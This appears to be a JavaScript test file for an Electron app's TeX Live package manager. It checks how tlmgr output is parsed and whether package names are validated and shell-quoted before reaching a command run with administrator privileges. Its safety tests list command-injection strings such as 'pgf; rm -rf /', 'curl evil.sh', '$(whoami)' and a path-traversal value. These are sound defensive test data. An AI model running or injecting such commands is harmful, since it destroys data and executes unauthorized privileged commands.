const test = require("node:test");
const assert = require("node:assert/strict");
const { execFile } = require("node:child_process");

const {
  TexPackageService,
  isValidPackageName,
  isArchPackage,
  splitDataRow,
  parseCatalog,
  parseCatalogLine,
  parseFileSearch,
  parseRemoveBlockers,
  parsePackageDetail,
  shellQuote,
  buildPrivilegedScript,
} = require("../electron/services/tex-package-manager.cjs");

test("catalogue rows survive commas and quotes inside the description", () => {
  assert.deepEqual(
    parseCatalogLine('tikz-cd,1,360448,"Create commutative diagrams with TikZ"'),
    {
      name: "tikz-cd",
      installed: true,
      sizeBytes: 360448,
      shortdesc: "Create commutative diagrams with TikZ",
      kind: "package",
    }
  );
  const commas = parseCatalogLine('siunitx,0,2396160,"Units, angles, and numbers"');
  assert.equal(commas.shortdesc, "Units, angles, and numbers");
  assert.equal(commas.installed, false);
  // An empty field (arch packages have no version) must not shift the columns.
  assert.equal(parseCatalogLine("a2ping.universal-darwin,,4096,\"x\"").sizeBytes, 4096);
  assert.deepEqual(splitDataRow('a,"b,c",d'), ["a", "b,c", "d"]);
  assert.deepEqual(splitDataRow('a,"say ""hi""",b'), ["a", 'say "hi"', "b"]);
});

test("collections and schemes are labelled, so removing one can be treated differently", () => {
  assert.equal(parseCatalogLine("collection-pictures,1,0,\"x\"").kind, "collection");
  assert.equal(parseCatalogLine("scheme-full,1,0,\"x\"").kind, "scheme");
  assert.equal(parseCatalogLine("pgf,1,0,\"x\"").kind, "package");
});

test("per-architecture binary halves are hidden from the catalogue", () => {
  // Every dotted name in TeX Live is an arch suffix; they are installed and
  // removed with their parent, so listing them is thousands of dead rows.
  assert.equal(isArchPackage("a2ping.universal-darwin"), true);
  assert.equal(isArchPackage("tikz-cd"), false);
  const output = [
    "pgf,1,20783104,\"Create PostScript and PDF graphics in TeX\"",
    "a2ping.universal-darwin,,4096,\"universal-darwin files of a2ping\"",
    "tikz-cd,0,360448,\"Create commutative diagrams with TikZ\"",
  ].join("\n");
  assert.deepEqual(
    parseCatalog(output).map((entry) => entry.name),
    ["pgf", "tikz-cd"]
  );
  assert.equal(parseCatalog(output, { includeArch: true }).length, 3);
});

test("file search groups the hits under the package that owns them", () => {
  const output = [
    "tlmgr: package repository https://mirror.ctan.org/systems/texlive/tlnet",
    "tex4ht:",
    "\ttexmf-dist/tex/generic/tex4ht/tikz-cd.4ht",
    "tikz-cd:",
    "\ttexmf-dist/tex/latex/tikz-cd/tikz-cd.sty",
    "\ttexmf-dist/tex/generic/tikz-cd/tikzlibrarycd.code.tex",
  ].join("\n");
  const parsed = parseFileSearch(output);
  assert.deepEqual(
    parsed.map((entry) => entry.name),
    ["tex4ht", "tikz-cd"]
  );
  assert.equal(parsed[1].files.length, 2);
  // The repository banner is chatter, not a package.
  assert.equal(parsed.some((entry) => entry.name.startsWith("tlmgr")), false);
});

test("a refused removal names what would break", () => {
  const output = [
    "tlmgr: not removing tikz-cd, needed by collection-pictures",
    "tlmgr: action remove returned an error; continuing.",
  ].join("\n");
  assert.deepEqual(parseRemoveBlockers(output), [
    { name: "tikz-cd", neededBy: "collection-pictures" },
  ]);
  assert.deepEqual(parseRemoveBlockers("[1/1] remove: foo"), []);
});

test("package detail carries the description, the collection and the file list", () => {
  const output = [
    "package:     tikz-cd",
    "shortdesc:   Create commutative diagrams with TikZ",
    "longdesc:    The general-purpose drawing package TikZ can be used...",
    "installed:   Yes",
    "sizes:       doc: 325k, run: 29k",
    "cat-version: 1.0",
    "cat-license: lppl1.3",
    "collection:  collection-pictures",
    "Included files, by type:",
    "run files:",
    "  texmf-dist/tex/latex/tikz-cd/tikz-cd.sty",
    "doc files:",
    '  texmf-dist/doc/latex/tikz-cd/tikz-cd-doc.pdf details="Package documentation"',
  ].join("\n");
  const detail = parsePackageDetail(output);
  assert.equal(detail.name, "tikz-cd");
  assert.equal(detail.installed, true);
  assert.equal(detail.collection, "collection-pictures");
  assert.equal(detail.license, "lppl1.3");
  assert.deepEqual(detail.files, [
    "texmf-dist/tex/latex/tikz-cd/tikz-cd.sty",
    "texmf-dist/doc/latex/tikz-cd/tikz-cd-doc.pdf",
  ]);
});

// --- safety ---------------------------------------------------------------
// Package names reach a command line that can run with administrator
// privileges, so the validation in front of it is load-bearing.

test("only real package names are accepted", () => {
  for (const good of ["pgf", "tikz-cd", "jlreq", "l3kernel", "a2ping.universal-darwin"]) {
    assert.equal(isValidPackageName(good), true, good);
  }
  for (const bad of [
    "pgf; rm -rf /",
    "pgf && curl evil.sh",
    "$(whoami)",
    "`id`",
    "pgf|tee",
    "../../etc/passwd",
    "pgf name",
    "'pgf'",
    '"pgf"',
    "pgf\nrm",
    "",
    "-rf",
    null,
    undefined,
  ]) {
    assert.equal(isValidPackageName(bad), false, String(bad));
  }
});

test("an install refuses a name that is not a package name", async () => {
  const service = new TexPackageService(null);
  let ran = false;
  service.runWrite = async () => {
    ran = true;
    return { ok: true, output: "" };
  };
  await assert.rejects(() => service.install(["pgf; rm -rf ~"]), /invalid package name/i);
  await assert.rejects(() => service.remove(["$(id)"]), /invalid package name/i);
  await assert.rejects(() => service.install([]), /No package/i);
  assert.equal(ran, false, "nothing may reach tlmgr once a name is rejected");
});

test("the privileged command quotes every argument as data", () => {
  assert.equal(shellQuote("a'b"), `'a'\\''b'`);
  const script = buildPrivilegedScript("/opt/tl/tlmgr", ["update", "--self", "--all"]);
  assert.equal(
    script,
    `do shell script "'/opt/tl/tlmgr' 'update' '--self' '--all'" with administrator privileges`
  );
  // Anything a hostile string could do has to survive as literal text.
  const nasty = buildPrivilegedScript("/opt/tl/tlmgr", ["install", 'a";id;"b']);
  assert.match(nasty, /with administrator privileges$/);
  assert.equal(nasty.includes('";id;"'), false, "the quote must not close early");
});

test("the quoting survives osascript and the shell underneath it", async (t) => {
  if (process.platform !== "darwin") {
    t.skip("osascript is macOS only");
    return;
  }
  // Same composition as the privileged path, without the escalation: whatever
  // comes back out of /bin/echo is what tlmgr would have received as argv.
  const args = ["plain", "with space", "apos'trophe", 'double"quote', "back\\slash", "semi;colon", "dollar$VAR", "back`tick`"];
  const script = buildPrivilegedScript("/bin/echo", args).replace(
    " with administrator privileges",
    ""
  );
  const out = await new Promise((resolve, reject) => {
    execFile("osascript", ["-e", script], (error, stdout) =>
      error ? reject(error) : resolve(stdout.trim())
    );
  });
  assert.equal(out, args.join(" "), "arguments must arrive as literal data");
});

test("the target is the managed tree when there is one, and it needs no password", () => {
  const service = new TexPackageService(null);
  // Simulated rather than mocked at the module level: resolveTarget is the one
  // place that decides whether a password prompt can happen at all.
  const target = service.resolveTarget();
  assert.ok(["managed", "system", "none"].includes(target.scope));
  if (target.scope === "managed") {
    assert.equal(target.needsAdmin, false, "our own tree must never ask for a password");
  }
  if (target.scope === "system") {
    assert.equal(target.needsAdmin, true, "a system tree is not writable without one");
  }
});

test("a read never asks for privileges, whichever tree it reads", async () => {
  const service = new TexPackageService(null);
  let privileged = false;
  service.resolveTarget = () => ({
    tlmgr: "/bin/echo",
    scope: "system",
    root: "/usr/local/texlive/2026",
    needsAdmin: true,
  });
  const original = service.runWrite.bind(service);
  service.runWrite = async (...args) => {
    privileged = true;
    return original(...args);
  };
  await service.getCatalog({ force: true });
  assert.equal(privileged, false, "listing packages must not prompt for a password");
});
